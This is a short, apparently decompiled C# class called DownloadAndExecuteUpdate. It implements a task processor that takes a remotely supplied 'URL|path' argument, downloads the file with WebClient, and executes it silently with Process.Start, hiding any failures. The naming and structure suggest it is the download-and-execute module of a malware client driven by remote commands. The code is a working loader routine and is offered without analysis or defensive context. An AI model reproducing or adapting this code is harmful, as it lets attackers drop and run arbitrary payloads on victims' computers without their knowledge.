using System;
using System.Diagnostics;
using System.IO;
using System.Net;

// Token: 0x02000032 RID: 50
public class DownloadAndExecuteUpdate : ITaskProcessor
{
	// Token: 0x06000111 RID: 273 RVA: 0x00003B69 File Offset: 0x00001D69
	public bool IsValidAction(UpdateAction action)
	{
		return action == UpdateAction.DownloadAndEx;
	}

	// Token: 0x06000112 RID: 274 RVA: 0x0000A49C File Offset: 0x0000869C
	public bool Process(UpdateTask updateTask)
	{
		try
		{
			string[] array = updateTask.TaskArg.Split(new string[]
			{
				"|"
			}, StringSplitOptions.RemoveEmptyEntries);
			new WebClient().DownloadFile(array[0], Environment.ExpandEnvironmentVariables(array[1]));
			System.Diagnostics.Process.Start(new ProcessStartInfo
			{
				WorkingDirectory = new FileInfo(Environment.ExpandEnvironmentVariables(array[1])).Directory.FullName,
				FileName = Environment.ExpandEnvironmentVariables(array[1])
			});
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}
}
